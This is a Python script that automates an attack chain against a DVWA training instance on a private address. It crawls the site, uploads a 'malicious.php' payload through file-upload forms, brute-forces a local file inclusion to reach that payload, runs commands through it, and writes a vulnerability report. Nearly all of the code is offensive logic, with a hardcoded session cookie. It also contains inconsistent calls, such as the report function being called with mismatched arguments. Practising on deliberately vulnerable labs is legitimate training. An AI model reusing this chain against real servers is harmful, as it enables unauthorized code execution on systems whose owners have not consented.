#!/usr/bin/env python3

from argparse import ArgumentParser
from sys import exit
import requests
from bs4 import BeautifulSoup
import urllib.parse
import crawler
import lfi
import upload


URL = "http://192.168.52.129/DVWA/"
WORDLIST = "wordlists/test"
COOKIE = {
    'PHPSESSID': 'ks3ah94pfi21cdhe2ck77b6h6g',
    'security': 'medium'
}
UPLOAD_DIR = f"{URL}hackable/uploads/"
PAYLOAD_FILENAME = "malicious.php"
REPORT_FILENAME = "vuln_report.txt"


def generate_report(uploaded_url, lfi_url, command_results):
    report = "Vulnerability Report\n"
    report += "====================\n"
    if uploaded_url:
        report += f"\nFile Upload Vulnerability:\nDirect URL: {uploaded_url}\n"
    if lfi_url:
        report += f"\nLFI Vulnerability Exploit URL:\n{lfi_url}\n"
    if command_results:
        report += "\nCommand Execution Results:\n"
        report += command_results
    with open(REPORT_FILENAME, "w") as f:
        f.write(report)
    print(f"[+] Report generated: {REPORT_FILENAME}")


def main():
    session = requests.Session()
    
    # Main function
    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
    print("Crawling complete.")

    found_urls = crawler.clean_found_urls(URL, found_urls)

    print ("Found URLs:")
    for url in found_urls:
        print("[+] URL: " + url)
    print("\nUploadable URLs:")
    for url in uploadable_urls:
        print("[+] File Upload Form: " + url)
    print("\nPotential LFI vulnerabilities...")
    lfi_targets = crawler.check_lfi(found_urls)

     # Generate the payloads
    payload_filenames = upload.create_payloads()

    # Upload payloads
    uploaded_files, failed_files = upload.upload_files(payload_filenames)

    # Test execution of uploaded files
    executed_files = upload.test_uploaded_files(uploaded_files)

    # Generate the vulnerability report
    generate_report(uploaded_files, failed_files, executed_files)

    # Upload the payload
    file_uploaded = False
    for url in uploadable_urls:
        if upload.upload_file(url, PAYLOAD_FILENAME, COOKIE):
            print("[+] File uploaded successfully!")
            file_uploaded = True
            break
    if not file_uploaded:
        print("[-] File upload failed. Exiting.")
        exit(1)

    # Direct URL to the uploaded file (if you can access it directly)
    direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
    print(f"[+] Direct file URL (if accessible): {direct_file_url}")

    # --- LFI Brute Force Phase ---
    payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME
    for url in lfi_targets:
        lfi_found_url = lfi.brute_force_lfi(url, payload_relative, session, COOKIE)
        if lfi_found_url:
            break
    # lfi_found_url = lfi.brute_force_lfi(LFI_VULN_URL, payload_relative, session)

    # --- Trigger Payload Phase ---
    if lfi_found_url:
        command_results = lfi.trigger_payload_via_lfi(lfi_found_url,COOKIE)
    else:
        print("[-] Could not locate the uploaded file via LFI.")
        command_results = ""

    # --- Report Generation ---
    generate_report(direct_file_url, lfi_found_url, command_results)
    



if __name__ == "__main__":
    main()